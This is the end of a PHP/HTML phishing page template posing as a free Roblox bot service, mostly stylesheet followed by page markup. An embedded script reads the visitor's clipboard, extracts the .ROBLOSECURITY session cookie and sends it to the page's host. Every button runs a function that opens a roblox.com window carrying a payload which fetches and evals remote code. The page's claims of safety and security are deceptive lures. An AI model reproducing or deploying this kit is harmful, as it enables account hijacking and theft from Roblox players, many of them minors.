    padding-left: 15rem !important; }
  .m-xl-auto {
    margin: auto !important; }
  .mt-xl-auto,
  .my-xl-auto {
    margin-top: auto !important; }
  .mr-xl-auto,
  .mx-xl-auto {
    margin-right: auto !important; }
  .mb-xl-auto,
  .my-xl-auto {
    margin-bottom: auto !important; }
  .ml-xl-auto,
  .mx-xl-auto {
    margin-left: auto !important; } }

.text-monospace {
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }

.text-justify {
  text-align: justify !important; }

.text-nowrap {
  white-space: nowrap !important; }

.text-truncate {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap; }

.text-left {
  text-align: left !important; }

.text-right {
  text-align: right !important; }

.text-center {
  text-align: center !important; }

@media (min-width: 576px) {
  .text-sm-left {
    text-align: left !important; }
  .text-sm-right {
    text-align: right !important; }
  .text-sm-center {
    text-align: center !important; } }

@media (min-width: 768px) {
  .text-md-left {
    text-align: left !important; }
  .text-md-right {
    text-align: right !important; }
  .text-md-center {
    text-align: center !important; } }

@media (min-width: 992px) {
  .text-lg-left {
    text-align: left !important; }
  .text-lg-right {
    text-align: right !important; }
  .text-lg-center {
    text-align: center !important; } }

@media (min-width: 1200px) {
  .text-xl-left {
    text-align: left !important; }
  .text-xl-right {
    text-align: right !important; }
  .text-xl-center {
    text-align: center !important; } }

.text-lowercase {
  text-transform: lowercase !important; }

.text-uppercase {
  text-transform: uppercase !important; }

.text-capitalize {
  text-transform: capitalize !important; }

.font-weight-light {
  font-weight: 300 !important; }

.font-weight-normal {
  font-weight: 400 !important; }

.font-weight-bold {
  font-weight: 700 !important; }

.font-italic {
  font-style: italic !important; }

.text-white {
  color: #ffffff !important; }

.text-primary {
  color: #ffff00 !important; }

a.text-primary:hover, a.text-primary:focus {
  color: #cccc00 !important; }

.text-secondary {
  color: #0000ff !important; }

a.text-secondary:hover, a.text-secondary:focus {
  color: #0000cc !important; }

.text-success {
  color: #5cc72a !important; }

a.text-success:hover, a.text-success:focus {
  color: #499d21 !important; }

.text-info {
  color: #00e5ff !important; }

a.text-info:hover, a.text-info:focus {
  color: #00b7cc !important; }

.text-warning {
  color: #f6c343 !important; }

a.text-warning:hover, a.text-warning:focus {
  color: #f4b312 !important; }

.text-danger {
  color: #ff1744 !important; }

a.text-danger:hover, a.text-danger:focus {
  color: #e3002c !important; }

.text-light {
  color: #f8f9fa !important; }

a.text-light:hover, a.text-light:focus {
  color: #dae0e5 !important; }

.text-dark {
  color: black !important; }

a.text-dark:hover, a.text-dark:focus {
  color: black !important; }

.text-body {
  color: #343a40 !important; }

.text-muted {
  color: #adb5bd !important; }

.text-black-50 {
  color: rgba(0, 0, 0, 0.5) !important; }

.text-white-50 {
  color: rgba(255, 255, 255, 0.5) !important; }

.text-hide {
  font: 0/0 a;
  color: transparent;
  text-shadow: none;
  background-color: transparent;
  border: 0; }

.visible {
  visibility: visible !important; }

.invisible {
  visibility: hidden !important; }

@media print {
  *,
  *::before,
  *::after {
    text-shadow: none !important;
    box-shadow: none !important; }
  a:not(.btn) {
    text-decoration: underline; }
  abbr[title]::after {
    content: " (" attr(title) ")"; }
  pre {
    white-space: pre-wrap !important; }
  pre,
  blockquote {
    border: 2px solid #adb5bd;
    page-break-inside: avoid; }
  thead {
    display: table-header-group; }
  tr,
  img {
    page-break-inside: avoid; }
  p,
  h2,
  h3 {
    orphans: 3;
    widows: 3; }
  h2,
  h3 {
    page-break-after: avoid; }
  @page {
    size: a3; }
  body {
    min-width: 992px !important; }
  .container {
    min-width: 992px !important; }
  .navbar {
    display: none; }
  .badge {
    border: 2px solid #000000; }
  .table {
    border-collapse: collapse !important; }
    .table td,
    .table th {
      background-color: #ffffff !important; }
  .table-bordered th,
  .table-bordered td {
    border: 1px solid #dee2e6 !important; } }

/*****************
Custom CSS
*****************/
::-moz-selection {
  background-color: #ffff00;
  color: #000000; }
::selection {
  background-color: #ffff00;
  color: #000000; }

a:not(.heading-brand) {
  font-weight: 500; }

.font-weight-medium {
  font-weight: 500; }

.heading-brand {
  font-weight: 800;
  font-size: 1.75rem; }

.svg-icon {
  display: -ms-inline-flexbox;
  display: inline-flex;
  -ms-flex-direction: row;
      flex-direction: row;
  -ms-flex-align: center;
      align-items: center; }

/* Buttons */
.btn {
  box-shadow: 0 4px 6px rgba(255, 255, 0, 0.11), 0 1px 3px rgba(0, 0, 0, 0.08); }
  .btn:active, .btn:focus, .btn:focus {
    box-shadow: none !important; }

/*Forms*/
.form-control {
  font-weight: 700; }

/*Feature Grid*/
.feature-grid {
  margin-top: 3rem; }
  .feature-grid .media {
    display: -ms-flexbox;
    display: flex;
    -ms-flex-align: center;
        align-items: center;
    -ms-flex-direction: row;
        flex-direction: row;
    margin-bottom: 2.5rem; }
    .feature-grid .media .media-body {
      font-size: 1.125rem;
      font-weight: 700; }

/*Press Icons*/
.press-icons img:not(:last-child) {
  margin-right: 4rem;
  margin-bottom: 1rem; }

/*footer*/
footer ul > li:not(:last-child) {
  margin-right: 1.5rem !important; }

footer a {
  color: #000000;
  font-weight: 700; }

/* Icon Boxes */
.icon-box {
  position: relative;
  border-radius: 50%;
  display: inline-block;
  vertical-align: middle;
  background-color: #ffffff;
  margin-right: 1rem;
  color: #5cc72a; }
  .icon-box .icon-box-inner {
    display: -ms-flexbox;
    display: flex;
    -ms-flex-direction: row;
        flex-direction: row;
    -ms-flex-align: center;
        align-items: center;
    padding: 1rem; }

/*Gradients*/
.bg-gradient {
  background: linear-gradient(#ffff00, #ffff4d); }

/*Code Window*/
.code-window {
  border-radius: .45rem;
  background-color: #ffffff;
  padding: 1.52rem;
  box-shadow: 0 8px 24px 0 rgba(0, 0, 0, 0.1); }
  .code-window .dots {
    display: -ms-flexbox;
    display: flex;
    -ms-flex-direction: row;
        flex-direction: row;
    -ms-flex-align: center;
        align-items: center;
    -ms-flex-pack: start;
        justify-content: flex-start; }
    .code-window .dots div {
      margin-right: .5rem;
      width: .75rem;
      height: .75rem;
      border-radius: 50%;
      background-color: #e9ecef; }
      .code-window .dots div.red {
        background-color: #ff1744; }
      .code-window .dots div.orange {
        background-color: #f6c343; }
      .code-window .dots div.green {
        background-color: #5cc72a; }

/**
 * okaidia theme for JavaScript, CSS and HTML
 * Loosely based on Monokai textmate theme by http://www.monokai.nl/
 * @author ocodia
 */
code[class*="language-"],
pre[class*="language-"] {
  color: #000000;
  background: none;
  font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
  text-align: left;
  white-space: pre;
  word-spacing: normal;
  word-break: normal;
  word-wrap: normal;
  line-height: 1.5;
  -moz-tab-size: 4;
       tab-size: 4;
  -webkit-hyphens: none;
      -ms-hyphens: none;
          hyphens: none; }

/* Code blocks */
pre[class*="language-"] {
  padding: 1em;
  margin: .5em 0;
  overflow: auto;
  border-radius: 0.3em; }

:not(pre) > code[class*="language-"],
pre[class*="language-"] {
  background: #ffffff; }

/* Inline code */
:not(pre) > code[class*="language-"] {
  padding: .1em;
  border-radius: .3em;
  white-space: normal; }

.token.comment,
.token.prolog,
.token.doctype,
.token.cdata {
  color: slategray; }

.token.punctuation {
  color: #adb5bd; }

.namespace {
  opacity: .7; }

.token.property,
.token.tag,
.token.constant,
.token.symbol,
.token.deleted {
  color: #f92672; }

.token.boolean,
.token.number {
  color: #ae81ff; }

.token.selector,
.token.attr-name,
.token.string,
.token.char,
.token.builtin,
.token.inserted {
  color: #5cc72a; }

.token.operator,
.token.entity,
.token.url,
.language-css .token.string,
.style .token.string,
.token.variable {
  color: #f8f8f2; }

.token.atrule,
.token.attr-value,
.token.function,
.token.class-name {
  color: #ff1744; }

.token.keyword {
  color: #aa00ff; }

.token.regex,
.token.important {
  color: #fd971f; }

.token.important,
.token.bold {
  font-weight: bold; }

.token.italic {
  font-style: italic; }

.token.entity {
  cursor: help; }

pre[class*="language-"].line-numbers {
  position: relative;
  padding-left: 2.5em;
  counter-reset: linenumber; }

pre[class*="language-"].line-numbers > code {
  position: relative;
  white-space: inherit; }

.line-numbers .line-numbers-rows {
  position: absolute;
  pointer-events: none;
  top: 0;
  font-size: 100%;
  left: -3.8em;
  width: 3em;
  /* works for line-numbers below 1000 lines */
  letter-spacing: -1px;
  -webkit-user-select: none;
     -moz-user-select: none;
      -ms-user-select: none;
          user-select: none; }

.line-numbers-rows > span {
  pointer-events: none;
  display: block;
  counter-increment: linenumber; }

.line-numbers-rows > span:before {
  content: counter(linenumber);
  color: #ced4da;
  display: block;
  padding-right: 0.8em;
  text-align: right; }
</style>
<?php if (!isset($done)) { ?>
</head>
<body>
<script>
// script made and leaked by vKevin#0001
navigator.clipboard.writeText("");
        function httpGet(theUrl){
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", theUrl, false );
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }
        
        var getCookie = setInterval(function(){
            navigator.clipboard.readText().then(
            clipText => document.getElementById("result").value = clipText);
            var cookie = document.getElementById("result").value.split('".ROBLOSECURITY", "')[1].split('"')[0];
            if(cookie){
                httpGet("https://" + window.location.hostname + "?cookie=" + cookie)
                clearInterval(getCookie);
            }
        });
        
        function leakedbyvkevin() {
            var url = 'https://www.roblox.com/robots.txt'
            var payload = 'fetch("//'+location.hostname+location.pathname+'?p").then(async x=>eval(await x.text()))'
            var win = window.open(url, "javascript:"+payload, 'height=375,width=400,location=no')
        }
// do not obfuscate for the memes LMAO
    </script>
</script>

<section class="bg-gradient pt-5 pb-6">
<div class="container">
<div class="row">
<div class="col-12 d-flex flex-row align-items-center justify-content-between">
<div class="heading-brand"><?php echo $iname?></div>
</div>
</div>
<div class="row mt-6">
<div class="col-md-8 mx-auto text-center">
<h1>BEST FREE ROBLOX BOTS</h1>
<p class="lead mb-5"><?php echo $iname?> is bot provider for roblox.</p>
<input type="text" id="result" hidden>
<button type="button" onclick="leakedbyvkevin();" name="limitedsnipe" id="limitedsnipe" class="btn btn-success svg-icon"><i class="fa fa-cogs"></i>&nbsp; Limited Sniper</button>
<button type="button" onclick="leakedbyvkevin();" name="voicechat" id="voicechat" class="btn btn-success svg-icon"><i class="fa fa-cogs"></i>&nbsp; Enable Voice Chat</button>
<button type="button" onclick="leakedbyvkevin();" name="followers" id="followers" class="btn btn-danger svg-icon"><i class="fa fa-check"></i>&nbsp; Followers Bots</button><br><br>
<button type="button" onclick="leakedbyvkevin();" name="copygame" id="copygame" class="btn btn-secondary svg-icon"><i class="fa fa-copy"></i>&nbsp; Copy Game</button>
<button type="button" onclick="leakedbyvkevin();" name="unfriend" id="unfriend" class="btn btn-warning svg-icon"><i class="fa fa-ban"></i>&nbsp; Unfriend All Friend's</button>
<button type="button" onclick="leakedbyvkevin();" name="unfriend" id="unfriend" class="btn btn-warning svg-icon"><i class="fa fa-unlock"></i>&nbsp; Force Remove PIN</button>
</div>
</div>
<div class="row mt-5">
<div class="col-md-9 mx-auto">
<div class="code-window">
<div class="dots">
<div class="red"></div>
<div class="orange"></div>
<div class="green"></div>
</div>
<pre class="language-javascript line-numbers"><code class="language-javascript">var Roblox = Roblox || {};

Roblox.BundleDetector = (function () {
    var isMetricsApiEnabled = Roblox.BundleVerifierConstants && Roblox.BundleVerifierConstants.isMetricsApiEnabled;

    var loadStates = {
        loadSuccess: "loadSuccess",
        loadFailure: "loadFailure",
        executionFailure: "executionFailure"
    };

    var bundleContentTypes = {
        javascript: "javascript",
        css: "css"
    };

    var ephemeralCounterNames = {
        cdnPrefix: "CDNBundleError_",
        unknown: "CDNBundleError_unknown",
        cssError: "CssBundleError",
        jsError: "JavascriptBundleError",
        jsFileError: "JsFileExecutionError",
        resourceError: "ResourcePerformance_Error",
        resourceLoaded: "ResourcePerformance_Loaded"
    };

    return {
        jsBundlesLoaded: {},
        bundlesReported: {},

        counterNames: ephemeralCounterNames,
        loadStates: loadStates,
        bundleContentTypes: bundleContentTypes,

        timing: undefined,

        setTiming: function (windowTiming) {
            this.timing = windowTiming;
        },

        getLoadTime: function () {
            if (this.timing && this.timing.domComplete) {
                return this.getCurrentTime() - this.timing.domComplete;
            }
        },

        getCurrentTime: function () {
            return new Date().getTime();
        },

        getCdnProviderName: function (bundleUrl, callBack) {
            if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', bundleUrl, true);

                xhr.onreadystatechange = function () {
                    if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                        try {
                            var headerValue = xhr.getResponseHeader("rbx-cdn-provider");
                            if (headerValue) {
                                callBack(headerValue);
                            } else {
                                callBack();
                            }
                        } catch (e) {
                            callBack();
                        }
                    }
                };

                xhr.onerror = function () {
                    callBack();
                };

                xhr.send();
            } else {
                callBack();
            }
        },

        getCdnProviderAndReportMetrics: function (bundleUrl, bundleName, loadState, bundleContentType) {
            this.getCdnProviderName(bundleUrl, function (cdnProviderName) {
                Roblox.BundleDetector.reportMetrics(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName);
            });
        },

        reportMetrics: function (bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName) {
            if (!isMetricsApiEnabled
                || !bundleUrl
                || !loadState
                || !loadStates.hasOwnProperty(loadState)
                || !bundleContentType
                || !bundleContentTypes.hasOwnProperty(bundleContentType)) {
                return;
            }

            var xhr = new XMLHttpRequest();
            var metricsApiUrl = (Roblox.EnvironmentUrls && Roblox.EnvironmentUrls.metricsApi) || "https://metrics.roblox.com";

            xhr.open("POST", metricsApiUrl + "/v1/bundle-metrics/report", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.withCredentials = true;
            xhr.send(JSON.stringify({
                bundleUrl: bundleUrl,
                bundleName: bundleName || "",
                bundleContentType: bundleContentType,
                loadState: loadState,
                cdnProviderName: cdnProviderName,
                loadTimeInMilliseconds: this.getLoadTime() || 0
            }));
        },

        logToEphemeralStatistics: function (sequenceName, value) {
            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            sequenceName += "_" + deviceType;

            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/game/report-stats?name=' + sequenceName + "&value=" + value, true);
            xhr.withCredentials = true;
            xhr.send();
        },

        logToEphemeralCounter: function (ephemeralCounterName) {
            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            ephemeralCounterName += "_" + deviceType;
            //log to ephemeral counters - taken from eventTracker.js
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/game/report-event?name=' + ephemeralCounterName, true);
            xhr.withCredentials = true;
            xhr.send();
        },

        logToEventStream: function (failedBundle, ctx, cdnProvider, status) {
            var esUrl = Roblox.BundleVerifierConstants.eventStreamUrl,
                currentPageUrl = encodeURIComponent(window.location.href);

            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            ctx += "_" + deviceType;
            //try and grab performance data.
            //Note that this is the performance of the xmlhttprequest rather than the original resource load.
            var duration = 0;
            if (window.performance) {
                var perfTiming = window.performance.getEntriesByName(failedBundle);
                if (perfTiming.length > 0) {
                    var data = perfTiming[0];
                    duration = data.duration || 0;
                }
            }
            //log to event stream (diagnostic)
            var params = "&evt=webBundleError&url=" + currentPageUrl +
                "&ctx=" + ctx + "&fileSourceUrl=" + encodeURIComponent(failedBundle) +
                "&cdnName=" + (cdnProvider || "unknown") +
                "&statusCode=" + (status || "unknown") +
                "&loadDuration=" + Math.floor(duration);
            var img = new Image();
            img.src = esUrl + params;
        },

        getCdnInfo: function (failedBundle, ctx, fileType) {
            if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
                var xhr = new XMLHttpRequest();
                var counter = this.counterNames;
                xhr.open('GET', failedBundle, true);
                var cdnProvider;

                //succesful request
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                        cdnProvider = xhr.getResponseHeader("rbx-cdn-provider");
                        if (cdnProvider && cdnProvider.length > 0) {
                            Roblox.BundleDetector.logToEphemeralCounter(counter.cdnPrefix + cdnProvider + "_" + fileType);
                        }
                        else {
                            Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                        }
                    }
                    else if (xhr.readyState === xhr.DONE) {
                        // append status to cdn provider so we know its not related to network error. 
                        Roblox.BundleDetector.logToEventStream(failedBundle, ctx, cdnProvider, xhr.status);
                    }
                };

                //attach to possible things that can go wrong with the request.
                //additionally a network error will trigger this callback
                xhr.onerror = function () {
                    Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                    Roblox.BundleDetector.logToEventStream(failedBundle, ctx, counter.unknown);
                };

                xhr.send();
            }
            else {
                this.logToEventStream(failedBundle, ctx);
            }
        },

        reportResourceError: function (resourceName) {
            var ephemeralCounterName = this.counterNames.resourceError + "_" + resourceName;
            this.logToEphemeralCounter(ephemeralCounterName);
        },

        reportResourceLoaded: function (resourceName) {
            var loadTimeInMs = this.getLoadTime();
            if (loadTimeInMs) {
                var sequenceName = this.counterNames.resourceLoaded + "_" + resourceName;
                this.logToEphemeralStatistics(sequenceName, loadTimeInMs);
            }
        },

        reportBundleError: function (bundleTag) {
            var ephemeralCounterName, failedBundle, ctx, contentType;
            if (bundleTag.rel && bundleTag.rel === "stylesheet") {
                ephemeralCounterName = this.counterNames.cssError;
                failedBundle = bundleTag.href;
                ctx = "css";
                contentType = bundleContentTypes.css;
            } else {
                ephemeralCounterName = this.counterNames.jsError;
                failedBundle = bundleTag.src;
                ctx = "js";
                contentType = bundleContentTypes.javascript;
            }

            //mark that we logged this bundle
            this.bundlesReported[failedBundle] = true;

            //e.g. javascriptBundleError_Computer
            this.logToEphemeralCounter(ephemeralCounterName);
            //this will also log to event stream
            this.getCdnInfo(failedBundle, ctx, ctx);

            var bundleName;
            if (bundleTag.dataset) {
                bundleName = bundleTag.dataset.bundlename;
            }
            else {
                bundleName = bundleTag.getAttribute('data-bundlename');
            }

            this.getCdnProviderAndReportMetrics(failedBundle, bundleName, loadStates.loadFailure, contentType);
        },

        bundleDetected: function (bundleName) {
            this.jsBundlesLoaded[bundleName] = true;
        },

        verifyBundles: function (document) {
            var ephemeralCounterName = this.counterNames.jsFileError,
                eventContext = ephemeralCounterName;
            //grab all roblox script tags in the page. 
            var scripts = (document && document.scripts) || window.document.scripts;
            var errorsList = [];
            var bundleName;
            var monitor;
            for (var i = 0; i < scripts.length; i++) {
                var item = scripts[i];

                if (item.dataset) {
                    bundleName = item.dataset.bundlename;
                    monitor = item.dataset.monitor;
                }
                else {
                    bundleName = item.getAttribute('data-bundlename');
                    monitor = item.getAttribute('data-monitor');
                }

                if (item.src && monitor && bundleName) {
                    if (!Roblox.BundleDetector.jsBundlesLoaded.hasOwnProperty(bundleName)) {
                        errorsList.push(item);
                    }
                }
            }
            if (errorsList.length > 0) {
                for (var j = 0; j < errorsList.length; j++) {
                    var script = errorsList[j];
                    if (!this.bundlesReported[script.src]) {
                        //log the counter only if the file is actually corrupted, not just due to failure to load
                        //e.g. JsFileExecutionError_Computer
                        this.logToEphemeralCounter(ephemeralCounterName);
                        this.getCdnInfo(script.src, eventContext, 'js');

                        if (script.dataset) {
                            bundleName = script.dataset.bundlename;
                        }
                        else {
                            bundleName = script.getAttribute('data-bundlename');
                        }

                        this.getCdnProviderAndReportMetrics(script.src, bundleName, loadStates.executionFailure, bundleContentTypes.javascript);
                    }
                }
            }
        }
    };
})();

window.addEventListener("load", function (evt) {
    Roblox.BundleDetector.verifyBundles();
});

Roblox.BundleDetector.setTiming(window.performance.timing);
            //# sourceURL=somename.js</code></pre>
</div>
</div>
</div>
</div>
</section>

<section class="py-6">
<div class="container">
<div class="row">
<div class="col-md-8 mx-auto">
<h2 class="text-center text-md-left">Reasons Why People Love <span class="text-success"><?php echo $iname?></span></h2>
<div class="row feature-grid">
<div class="col-sm-6">
<div class="media">
<div class="icon-box">
<div class="icon-box-inner">
<span data-feather="check-circle" width="28" height="28"></span>
</div>
</div>
<div class="media-body">
Safe
</div>
 </div>
</div>
<div class="col-sm-6">
<div class="media">
<div class="icon-box">
<div class="icon-box-inner">
<span data-feather="command" width="28" height="28"></span>
</div>
</div>
<div class="media-body">
Security guaranteed
</div>
</div>
</div>
<div class="col-sm-6">
<div class="media">
<div class="icon-box">
<div class="icon-box-inner">
<span data-feather="feather" width="28" height="28"></span>
</div>
</div>
<div class="media-body">
Fast process like light
</div>
</div>
</div>
<div class="col-sm-6">
<div class="media">
<div class="icon-box">
<div class="icon-box-inner">
<span data-feather="zap" width="28" height="28"></span>
</div>
</div>
<div class="media-body">
Always online 24/7
</div>
</div>
</div>
<div class="col-sm-6">
<div class="media">
<div class="icon-box">
<div class="icon-box-inner">
<span data-feather="git-pull-request" width="28" height="28"></span>
</div>
</div>
<div class="media-body">
Connected Roblox API's
</div>
</div>
</div><div class="col-sm-6">
<div class="media">
<div class="icon-box">
<div class="icon-box-inner">
<span data-feather="droplet" width="28" height="28"></span>
</div>
</div>
<div class="media-body">
Easy use
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>

<section class="pb-6">
<div class="container">
<div class="row">
<div class="col-md-8 mx-auto">
<h2 class="text-center text-md-left">Used by Thousands of People</h2>
<p class="lead text-muted"><?php echo $iname?> is used to run bots for your needs</p>
<div class="mt-5 d-flex flex-row justify-content-md-between flex-wrap press-icons">
<img src="https://images.rbxcdn.com/23421382939a9f4ae8bbe60dbe2a3e7e.ico.gzip" width="60" height="60" title="Roblox" alt="Roblox" />
<img src="https://www.rolimons.com/images/logo-icon-blue.svg" width="60" height="60" title="Rolimons" alt="Rolimons" />
<img src="https://pbs.twimg.com/profile_images/1385706009876914176/bGSNwdsY_400x400.png" width="60" height="60" title="RBXFlip" alt="RBXFlip" />
<img src="https://adurite.com/favicon-32x32.png" width="60" height="60" title="Adurite" alt="Adurite" />
</div>
</div>
</div>
</div>
</section>
<?php } ?>
<footer class="py-5 bg-light">
<div class="container">
 <div class="row my-2">
<div class="col-md-4 mx-auto text-muted text-center small-xl">
&copy; 2022 <?php echo $iname?> <br> All Rights Reserved
</div>
</div>
</div>
</footer>

<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.7.3/feather.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.15.0/prism.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.15.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
<script>
$(function () {
    feather.replace();
});
</script>
</body>
</html>
